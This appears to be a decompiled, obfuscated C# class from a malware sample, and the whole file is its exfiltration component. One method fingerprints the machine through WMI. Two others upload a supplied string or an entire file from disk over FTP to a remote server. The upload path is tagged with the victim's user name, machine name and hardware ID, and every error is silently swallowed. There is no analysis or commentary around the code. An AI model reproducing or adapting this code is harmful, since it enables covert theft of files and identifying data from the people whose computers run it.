using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace DFgOqDzZpZe;

internal sealed class PpFuqDxUfCPuFpcCn
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string zsSYEipMaODL()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107401983));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107401994)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107401945);
			ManagementObject val3 = new ManagementObject(getString_0(107401972) + text2 + getString_0(107401931));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107401894)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389628) : text;
		}
	}

	public static void ooOKBAfijtpYELQ(string ZCqszQeqJHLboFBw = "URL", string gZUUPhFuFjV = "USERNAME", string SxPCgIbTzke = "ACCESO", string cUaAOShGAk = "")
	{
		try
		{
			string text = zsSYEipMaODL();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(ZCqszQeqJHLboFBw + getString_0(107403708) + Environment.UserName + getString_0(107403727) + Environment.MachineName + getString_0(107403674) + text + getString_0(107403701));
			ftpWebRequest.Method = getString_0(107401901);
			ftpWebRequest.Credentials = new NetworkCredential(gZUUPhFuFjV, SxPCgIbTzke);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(cUaAOShGAk);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void yOpVYrZhtvsYB(string TUAQgZtdaYdZev = "URL", string pnXkRcAySJVrLy = "USERNAME", string lApqucyjrnxTb = "ACCESO", string ZwdVRhVJitGopRw = "")
	{
		try
		{
			string text = zsSYEipMaODL();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(TUAQgZtdaYdZev + getString_0(107403708) + Environment.UserName + getString_0(107403727) + Environment.MachineName + getString_0(107403674) + text + getString_0(107403674) + Path.GetFileName(ZwdVRhVJitGopRw));
			ftpWebRequest.Method = getString_0(107401901);
			ftpWebRequest.Credentials = new NetworkCredential(pnXkRcAySJVrLy, lApqucyjrnxTb);
			byte[] array = File.ReadAllBytes(ZwdVRhVJitGopRw);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static PpFuqDxUfCPuFpcCn()
	{
		Strings.CreateGetStringDelegate(typeof(PpFuqDxUfCPuFpcCn));
	}
}
